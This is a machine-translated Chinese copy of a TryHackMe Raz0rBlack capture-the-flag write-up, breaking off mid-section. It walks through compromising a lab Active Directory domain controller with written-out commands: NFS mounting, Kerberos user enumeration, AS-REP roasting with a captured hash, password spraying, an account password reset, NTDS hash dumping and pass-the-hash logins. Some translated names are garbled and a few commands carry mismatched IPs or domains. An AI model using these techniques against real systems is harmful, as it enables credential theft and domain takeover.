<html>
<head>
<title>THM: Raz0rBlack</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">THM: Raz0rBlack</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/thm-raz0rblack-b368631c38a5?source=collection_archive---------1-----------------------#2022-04-24">https://infosecwriteups.com/thm-raz0rblack-b368631c38a5?source=collection_archive---------1-----------------------#2022-04-24</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/ccda82f92604b188937554ebf8f0500f.png" data-original-src="https://miro.medium.com/v2/resize:fit:874/format:webp/1*IiF4IUOQlCqqs52rPnXBMg.png"/></div></figure><p id="56f0" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">在本文中，我通过枚举RPCbind &amp; NFS、滥用Kerberos、枚举SMB以及通过利用属于<strong class="jw ir"> Backup Operators </strong>组的一个用户来提升我在域控制器上的权限，逐步完成了利用域控制器的过程。这个挑战在<a class="ae ks" href="https://tryhackme.com/" rel="noopener ugc nofollow" target="_blank"> TryHackMe </a>平台上有，标题为“<strong class="jw ir"> RAZ0RBLACK 2.1 </strong>，由用户“<a class="ae ks" href="https://tryhackme.com/p/Xyan1d3" rel="noopener ugc nofollow" target="_blank"> <em class="kt"> Xyan1d3 </em> </a>”创建。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="905b" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">放弃</h1><p id="9867" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我喜欢在一篇文章之前添加一个简短的免责声明，以鼓励人们在阅读本文之前尝试一下这个房间，因为在这篇文章中显然会有<strong class="jw ir">剧透</strong><strong class="jw ir"/>。我相信，如果你先自己尝试，然后在遇到困难或需要提示时再回来写这篇文章，你会更喜欢这个挑战。因此，没有任何进一步的拖延，让我们开始吧！</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="952d" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">端口枚举</h1><p id="ff96" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我开始枚举目标机器，用<strong class="jw ir"> NMAP </strong>执行快速扫描来识别任何打开的端口。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="ebc2" class="mn lc iq mj b gy mo mp l mq mr">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report -Pn 10.10.7.159</span><span id="8dbc" class="mn lc iq mj b gy ms mp l mq mr">PORT      STATE SERVICE          REASON<br/>53/tcp    open  domain           syn-ack ttl 125<br/>88/tcp    open  kerberos-sec     syn-ack ttl 125               111/tcp   open  rpcbind          syn-ack ttl 125<br/>135/tcp   open  msrpc            syn-ack ttl 125<br/>139/tcp   open  netbios-ssn      syn-ack ttl 125<br/>445/tcp   open  microsoft-ds     syn-ack ttl 125<br/>593/tcp   open  http-rpc-epmap   syn-ack ttl 125<br/>636/tcp   open  ldapssl          syn-ack ttl 125<br/>2049/tcp  open  nfs              syn-ack ttl 125<br/>3268/tcp  open  globalcatLDAP    syn-ack ttl 125<br/>3269/tcp  open  globalcatLDAPssl syn-ack ttl 125<br/>3389/tcp  open  ms-wbt-server    syn-ack ttl 125<br/>5985/tcp  open  wsman            syn-ack ttl 125<br/>9389/tcp  open  adws             syn-ack ttl 125<br/>47001/tcp open  winrm            syn-ack ttl 125<br/>49664/tcp open  unknown          syn-ack ttl 125<br/>49665/tcp open  unknown          syn-ack ttl 125<br/>49666/tcp open  unknown          syn-ack ttl 125<br/>49669/tcp open  unknown          syn-ack ttl 125<br/>49672/tcp open  unknown          syn-ack ttl 125<br/>49675/tcp open  unknown          syn-ack ttl 125<br/>49676/tcp open  unknown          syn-ack ttl 125<br/>49679/tcp open  unknown          syn-ack ttl 125<br/>49694/tcp open  unknown          syn-ack ttl 125<br/>49708/tcp open  unknown          syn-ack ttl 125<br/>49846/tcp open  unknown          syn-ack ttl 125</span></pre><p id="bf85" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">查看输出，我可以看到有26个端口是打开的。接下来，我使用NMAP来识别每个端口上运行的服务，并使用通用的NSE脚本来查找我可以利用的任何常见漏洞。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="0a3e" class="mn lc iq mj b gy mo mp l mq mr">nmap -sV -sC -Pn -v -oN nmap-report 10.10.7.159 -p 53,111,135,139,445,593,636,2049,3268,3269,3389,5985,9389,47001,49664,49665,49666,49669,49672,49675,49676,49679,49694,49708,49846</span></pre><p id="e56b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到NMAP的大量输出和一些有趣的服务，我可以进一步列举。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="8153" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Rpcbind和NFS枚举</h1><p id="529c" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">当NMAP扫描运行rpcbind服务的端口111时，它收集了大量信息。<strong class="jw ir"> rpcbind </strong>服务将客户端重定向到正确的端口号，以便它可以与所请求的服务进行通信。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="915f" class="mn lc iq mj b gy mo mp l mq mr">111/tcp   open  rpcbind       2-4 (RPC #100000)<br/>| rpcinfo: <br/>|   program version    port/proto  service<br/>|   100000  2,3,4        111/tcp   rpcbind<br/>|   100000  2,3,4        111/tcp6  rpcbind<br/>|   100000  2,3,4        111/udp   rpcbind<br/>|   100000  2,3,4        111/udp6  rpcbind<br/>|   100003  2,3         2049/udp   nfs  <strong class="mj ir">&lt;---- Interesting</strong><br/>|   100003  2,3         2049/udp6  nfs<br/>|   100003  2,3,4       2049/tcp   nfs<br/>|   100003  2,3,4       2049/tcp6  nfs<br/>|   100005  1,2,3       2049/tcp   mountd<br/>|   100005  1,2,3       2049/tcp6  mountd<br/>|   100005  1,2,3       2049/udp   mountd<br/>|   100005  1,2,3       2049/udp6  mountd<br/>|   100021  1,2,3,4     2049/tcp   nlockmgr<br/>|   100021  1,2,3,4     2049/tcp6  nlockmgr<br/>|   100021  1,2,3,4     2049/udp   nlockmgr<br/>|   100021  1,2,3,4     2049/udp6  nlockmgr<br/>|   100024  1           2049/tcp   status<br/>|   100024  1           2049/tcp6  status<br/>|   100024  1           2049/udp   status<br/>|_  100024  1           2049/udp6  status</span></pre><p id="0e1b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到NMAP标识了<a class="ae ks" href="https://book.hacktricks.xyz/pentesting/pentesting-rpcbind#rpcbind-+-nfs" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir"> NFS </strong>服务</a>，这意味着我可以列出并下载(也许还可以上传)文件。我还可以看到NMAP找到了NFS运行的2049端口。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="1a80" class="mn lc iq mj b gy mo mp l mq mr">2049/tcp  open  mountd        1-3 (RPC #100005)</span></pre><p id="de39" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">NFS是一个客户机/服务器系统，它允许用户通过网络访问文件，并将它们视为驻留在本地文件目录中。我可以使用<strong class="jw ir"> showmount </strong>工具检查是否有任何共享可供安装。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="59f3" class="mn lc iq mj b gy mo mp l mq mr">$sudo showmount -e 10.10.7.159<br/>[sudo] password for kali: <br/>Export list for 10.10.7.159:<br/><strong class="mj ir">/users (everyone)</strong></span></pre><p id="ead5" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">“<strong class="jw ir"><em class="kt">/用户</em> </strong>”目录是可挂载的。我在tmp文件夹下创建了一个新目录，并运行以下命令在这个新创建的目录上挂载主文件夹。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="55d4" class="mn lc iq mj b gy mo mp l mq mr">mkdir /tmp/infosec<br/>mount -t nfs 10.10.63.208:/users /tmp/infosec</span></pre><p id="9322" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">接下来，我检查了目录是否成功挂载。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="d714" class="mn lc iq mj b gy mo mp l mq mr">$ df -k</span><span id="8481" class="mn lc iq mj b gy ms mp l mq mr">10.10.7.159:/users  20407296  16603136   3804160  82% /tmp/infosec</span></pre><p id="ab22" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我导航到“<strong class="jw ir"> <em class="kt"> /tmp/infosec </em> </strong>”目录，列出内容。我可以看到有两个文件。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="f315" class="mn lc iq mj b gy mo mp l mq mr">$ sudo ls -la /tmp/infosec<br/><br/>-rwx------  1 nobody 4294967294  9861 Feb 25  2021 <strong class="mj ir">employee_status.xlsx</strong><br/>-rwx------  1 nobody 4294967294    80 Feb 25  2021 <strong class="mj ir">sbradley.txt</strong></span></pre><p id="7267" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我将这两个文件复制到我当前的工作目录中，并为用户Steven检索第一个标志，它存储在“<strong class="jw ir"> <em class="kt"> sbradley.txt </em> </strong>”中。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/2c5a81ccb6304a56531576e83c32d294.png" data-original-src="https://miro.medium.com/v2/resize:fit:882/format:webp/1*6Uc_vHO6VG9P-vhE1L5vxQ.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">史蒂文的旗子。</figcaption></figure><p id="99bd" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">接下来，我打开了“<strong class="jw ir"><em class="kt">employee _ status . xlsx</em></strong>”文件。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi my"><img src="../Images/012509891d2ecf25ce9cef64976838cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1256/format:webp/1*Axi692Cc6FwTB1mE8OWxeA.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated"><strong class="bd ld"><em class="mz">employee _ status . xlsx</em></strong>文件内容。</figcaption></figure><p id="2bea" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到haven secret hacker俱乐部中的玩家及其角色列表。用户"<strong class="jw ir"><em class="kt">ljudmila vetrova</em></strong>"特别有趣，因为他们是活动目录管理员。</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="5597" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Kerberos枚举</h1><p id="9ad8" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">Kerberos是运行在端口88上的Active Directory中的一项关键身份验证服务。我们可以使用工具<strong class="jw ir">Kerberos</strong>来枚举用户，通过Kerberos预认证，可以快速强制枚举有效的Active Directory帐户。要使用<strong class="jw ir"> kerbrute </strong>，我们需要指定域名并提供一个用户列表。此前，NMAP根据3389端口提供的信息，已将该域名确定为“<strong class="jw ir"><em class="kt">”Raz 0 rblack . thm</em></strong>”。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="bd60" class="mn lc iq mj b gy mo mp l mq mr">3389/tcp  open  ms-wbt-server Microsoft Terminal Services<br/>| rdp-ntlm-info: <br/>|   Target_Name: RAZ0RBLACK<br/>|   NetBIOS_Domain_Name: RAZ0RBLACK<br/>|   NetBIOS_Computer_Name: HAVEN-DC<br/>|   DNS_Domain_Name: <strong class="mj ir">raz0rblack.thm</strong><br/>|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm</span></pre><p id="2f39" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们还可以利用前面在“<strong class="jw ir"><em class="kt">employee _ status . xlsx</em></strong>”文件中发现的姓名列表来枚举用户。根据用于“<em class="kt"> sbradley.txt </em>”和质询问题的命名约定，用户名字的首字母与其姓氏连接在一起。在基于“<strong class="jw ir"><em class="kt">employee _ status . xlsx</em></strong>”文件中的名称列表创建用户列表时，我使用了这个命名约定。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="68ff" class="mn lc iq mj b gy mo mp l mq mr">./kerbrute_linux_amd64 userenum --dc 10.10.253.179 -d spookysec.local -o kerbrute-user-enum userlist</span><span id="bc18" class="mn lc iq mj b gy ms mp l mq mr">2022/04/09 20:40:42 &gt;  [+] VALID USERNAME:  lvetrova@raz0rblack.thm<br/>2022/04/09 20:40:42 &gt;  [+] VALID USERNAME:  twilliams@raz0rblack.thm<br/>2022/04/09 20:40:42 &gt;  [+] VALID USERNAME:  sbradley@raz0rblack.thm</span></pre><h2 id="f6af" class="mn lc iq bd ld na nb dn lh nc nd dp ll kf ne nf lp kj ng nh lt kn ni nj lx nk bi translated">as重新发布</h2><p id="f102" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">现在我有了一些用户名，我决定进行重新发布。当用户帐户设置了权限“<em class="kt">不需要预认证</em>”时，会出现这种情况。这意味着在请求指定用户帐户上的Kerberos票证之前，帐户不需要提供有效的身份证明。使用Impacket工具"<strong class="jw ir"><em class="kt">getnpusers . py</em></strong>"，我们可以检查之前用Kerberos标识的枚举用户列表。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="8c33" class="mn lc iq mj b gy mo mp l mq mr">sudo python3 GetNPUsers.py raz0rblack.thm/ -dc-ip 10.10.160.198 -usersfile kerberos-usernames -no-pass -request -outputfile kerberos-users-found</span></pre><p id="9261" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">查看输出文件，我可以看到我们为用户“<strong class="jw ir"><em class="kt">twilliams @ Raz 0 r black . thm</em></strong>”获得了一张TGT的票</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="9cd4" class="mn lc iq mj b gy mo mp l mq mr">$krb5asrep$23$twilliams@raz0rblack.thm@RAZ0RBLACK.THM:50792603765164974bfbcf6b50a79f03$515241628dc6711dd499f6e5c23493b674b4b641c55df1b773fcccc0322ec68b45fa32e84c5f9b6d1097fac39097e6302f7835af51c6c05ac1b5fa392737eb021ea564c392916745a29ac4f7b37f735970ce9bb904c74ebb530086dc93e9b7b8b494e33393430deac61523ebae352a820d64d081fd112219e66331e4cb9ca45f5bba18276606c307b541ee7196d57c224e0f6a491fb0e1327dc2fc63ee62b56e0244a93ef6de3d56ee346fb439674d08ea745d8f927225daf809979329dd0b217d7633f47bcd864b82c135c1f1203b7290f14ad4fec88dce9c49b8e2afa381e5568e7a39fde062ff9d659270015fa9ca</span></pre><p id="d9d9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">接下来，我可以使用<strong class="jw ir"> hashcat </strong>来破解从KDC中检索到的"<strong class="jw ir"><em class="kt">Kerberos 5 AS-REP etype 23</em></strong>"哈希。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="7554" class="mn lc iq mj b gy mo mp l mq mr">hashcat64.exe -m 18200 -a 0 hash.txt rockyou.txt </span></pre><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/4a96a98a37948c44559618985344f3ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1312/format:webp/1*YjIpLjfRKV0JbgaBSpqTuA.png"/></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">破解哈希。</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="a053" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">SMB枚举</h1><p id="0760" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">我可以看到端口139和445是打开的。端口139和445用于<strong class="jw ir">认证和文件共享</strong>。有多种工具可用于枚举端口139/445。我是用<strong class="jw ir"> smbmap开始的。</strong></p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="9367" class="mn lc iq mj b gy mo mp l mq mr">smbmap -H 10.10.160.198 -u twilliams -p roastpotatoes<br/>                                    <br/>Disk                    Permissions     Comment<br/>----                    -----------     -------<br/>ADMIN$                  NO ACCESS       Remote Admin<br/>C$                      NO ACCESS       Default share<br/>IPC$                    READ ONLY       Remote IPC<br/>NETLOGON                READ ONLY       Logon server share <br/>SYSVOL                  READ ONLY       Logon server share <br/><strong class="mj ir">trash                   NO ACCESS       Files Pending for deletion</strong></span></pre><p id="9570" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到<strong class="jw ir"> IPC$ </strong>是<strong class="jw ir">只读</strong>，表示我们可以枚举用户名。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="62fc" class="mn lc iq mj b gy mo mp l mq mr">crackmapexec smb 10.10.160.198 -u twilliams -p &lt;....&gt; --rid-brute</span><span id="f323" class="mn lc iq mj b gy ms mp l mq mr">500: RAZ0RBLACK\Administrator (SidTypeUser)<br/>501: RAZ0RBLACK\Guest (SidTypeUser)<br/>502: RAZ0RBLACK\krbtgt (SidTypeUser)<br/>1000: RAZ0RBLACK\HAVEN-DC$ (SidTypeUser)<br/>1106: RAZ0RBLACK\xyan1d3 (SidTypeUser)<br/>1107: RAZ0RBLACK\lvetrova (SidTypeUser)<br/>1108: RAZ0RBLACK\sbradley (SidTypeUser)<br/>1109: RAZ0RBLACK\twilliams (SidTypeUser)</span></pre><p id="3e37" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我可以看到一个有趣的SMB共享，名为“<strong class="jw ir"><em class="kt">”trash</em>”</strong>，但我目前没有用户“<strong class="jw ir"> <em class="kt"> twilliams </em> </strong>”的凭据来访问它。我决定使用<strong class="jw ir"> crackmapexec </strong>和IPC$ share中枚举的用户列表来检查密码重用。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="5d7b" class="mn lc iq mj b gy mo mp l mq mr">crackmapexec smb 10.10.169.150 -u userlist -p &lt;....&gt;</span><span id="46b4" class="mn lc iq mj b gy ms mp l mq mr">[-] raz0rblack.thm\Administrator:&lt;pass&gt; STATUS_LOGON_FAILURE <br/>[-] raz0rblack.thm\guest:&lt;pass&gt; STATUS_LOGON_FAILURE <br/>[-] raz0rblack.thm\krbtgt:&lt;pass&gt; STATUS_LOGON_FAILURE <br/>[-] raz0rblack.thm\HAVEN-DC$:&lt;pass&gt; STATUS_LOGON_FAILURE <br/>[-] raz0rblack.thm\ljudmila:&lt;pass&gt; STATUS_LOGON_FAILURE <br/>[-] raz0rblack.thm\lvetrova:&lt;pass&gt; STATUS_LOGON_FAILURE <br/><strong class="mj ir">[-] raz0rblack.thm\sbradley:&lt;pass&gt; STATUS_PASSWORD_MUST_CHANGE</strong></span></pre><p id="2fa1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">看来用户“<strong class="jw ir"><em class="kt">SBR adley</em></strong>”<strong class="jw ir"/>可以重置自己的密码。我们可以指定旧密码(即上面与crackmapexec一起使用的密码)和工具<strong class="jw ir"> smbpasswd </strong>来重置用户密码。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="a665" class="mn lc iq mj b gy mo mp l mq mr">smbpasswd -r 10.10.169.150 -U sbradley</span><span id="b094" class="mn lc iq mj b gy ms mp l mq mr">Old SMB password:<br/>New SMB password:<br/>Retype new SMB password:<br/>Password changed for user sbradley</span></pre><p id="df76" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我现在可以使用用户“<strong class="jw ir"><em class="kt">SBR adley</em></strong>”<strong class="jw ir"/>的新重置凭据来进一步枚举SMB共享。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="c312" class="mn lc iq mj b gy mo mp l mq mr">smbmap -H 10.10.127.15 -u sbradley -p password<br/>                                  <br/>Disk                     Permissions     Comment<br/>----                     -----------     -------<br/>ADMIN$                   NO ACCESS       Remote Admin<br/>C$                       NO ACCESS       Default share<br/>IPC$                     READ ONLY       Remote IPC<br/>NETLOGON                 READ ONLY       Logon server share <br/>SYSVOL                   READ ONLY       Logon server share <br/>trash                    <strong class="mj ir">READ ONLY</strong>       Files Pending for deletion</span></pre><p id="fd8b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我看到我现在对名为<strong class="jw ir"> trash </strong>的SMB共享拥有只读访问权限。查看共享的内容，我可以看到三个文件。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="caa4" class="mn lc iq mj b gy mo mp l mq mr">smbclient //10.10.127.15/trash -U sbradley <br/><br/>smb: \&gt; ls<br/><br/>chat_log_20210222143423.txt     A     1340  Thu Feb 25 19:29:05 2021<br/>experiment_gone_wrong.zip       A 18927164  Tue Mar 16 06:02:20 2021<br/>sbradley.txt                    A       37  Sat Feb 27 19:24:21 2021</span></pre><p id="6146" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">查看“<em class="kt">chat _ log _ 20210222143423 . txt</em>”文件，可以看到<strong class="jw ir">CVE-2020–1472</strong>(即ZeroLogon)被提及。用户"<em class="kt"> sbradley </em>"似乎也制作了一个包含<strong class="jw ir"> ntds.dit </strong>和<strong class="jw ir"> SYSTEM.hive </strong>文件的加密zip，然后管理员撤销了他们的WinRM-Access。我用<strong class="jw ir"> fcrackzip </strong>找到了带有“<em class="kt"> rockyou.txt </em>单词表的加密zip文件的密码。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="cd8a" class="mn lc iq mj b gy mo mp l mq mr">fcrackzip -u -D -p ~/rockyou.txt experiment_gone_wrong.zip</span><span id="ff47" class="mn lc iq mj b gy ms mp l mq mr">PASSWORD FOUND!!!!: pw == electro......</span></pre><p id="18ad" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我提取了<strong class="jw ir"> ntds.dit </strong>和<strong class="jw ir"> SYSTEM.hive </strong>文件，然后我使用了“<strong class="jw ir"><em class="kt">secrets dump . py</em></strong>”来提取密码哈希。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="ccf4" class="mn lc iq mj b gy mo mp l mq mr">sudo python3 secretsdump.py -system system.hive -ntds ntds.dit LOCAL</span></pre><p id="f816" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这给了我一个很长的潜在散列列表。我使用<strong class="jw ir"> cut </strong>命令从"<strong class="jw ir"><em class="kt">secrets dump . py</em></strong>"的输出中提取实际的散列。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="2f45" class="mn lc iq mj b gy mo mp l mq mr">cat hashes | cut -d ':' -f 4</span></pre><p id="2a5c" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">接下来，我使用<strong class="jw ir"> crackmapexec </strong>来为用户<strong class="jw ir">lvert ova</strong>识别散列。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="08e4" class="mn lc iq mj b gy mo mp l mq mr">crackmapexec smb 10.10.105.22 -u lvetrova -H userhashes</span><span id="259c" class="mn lc iq mj b gy ms mp l mq mr">[+] raz0rblack.thm\lvetrova:f220d3988deb**************</span></pre><p id="eefe" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在我们有了用户的散列，我们可以使用<strong class="jw ir"> evil-winrm </strong>来执行一个传递散列攻击来登录。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="3f17" class="mn lc iq mj b gy mo mp l mq mr">evil-winrm -u lvetrova -H f220d3988deb3f***** -i 10.10.105.22 -N</span></pre><p id="aa4e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我开始枚举目标，找到一个名为<strong class="jw ir"><em class="kt">“lvetrova . xml</em>”</strong>的XML文件。</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="c544" class="mn lc iq mj b gy mo mp l mq mr">*Evil-WinRM* PS C:\Users\lvetrova&gt; dir</span><span id="f99b" class="mn lc iq mj b gy ms mp l mq mr">Directory: C:\Users\lvetrova</span><span id="3d03" class="mn lc iq mj b gy ms mp l mq mr">Mode                LastWriteTime         Length Name<br/>----                -------------         ------ ----<br/>d-r---        9/15/2018  12:19 AM                Desktop<br/>d-r---        2/25/2021  10:14 AM                Documents<br/>d-r---        9/15/2018  12:19 AM                Downloads<br/>d-r---        9/15/2018  12:19 AM                Favorites<br/>d-r---        9/15/2018  12:19 AM                Links<br/>d-r---        9/15/2018  12:19 AM                Music<br/>d-r---        9/15/2018  12:19 AM                Pictures<br/>d-----        9/15/2018  12:19 AM                Saved Games<br/>d-r---        9/15/2018  12:19 AM                Videos<br/><strong class="mj ir">-a----        2/25/2021  10:16 AM           1692 lvetrova.xml</strong></span></pre><p id="788a" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我使用了<strong class="jw ir"> type </strong>命令来显示文件的内容，我可以看到这是一个PSCredential PowerShell xml文件。PSCredential对象<strong class="jw ir">表示一组安全凭证，比如用户名和密码</strong>。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nm"><img src="../Images/1ef5d7e75babd253a097c6e3badbc4d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1ymoDKJG4b2RlHqanINFrQ.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">PSCredential PowerShell xml文件。</figcaption></figure><p id="dc11" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我们可以使用<a class="ae ks" href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx" rel="noopener ugc nofollow" target="_blank"> PowerShell </a>读取xml文件中存储的标志，如下所示。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nn no di np bf nq"><div class="gh gi nr"><img src="../Images/5142201ea171b7e622a685873b084b40.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FrLzejEPFcHWK90YG7RWcQ.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">柳德米拉的旗帜。</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="f28d" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Kerberoasting</h1><p id="777b" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">因为我们有一个有效的散列，所以我可以寻找支持的SPN，并使用Impacket中的“<strong class="jw 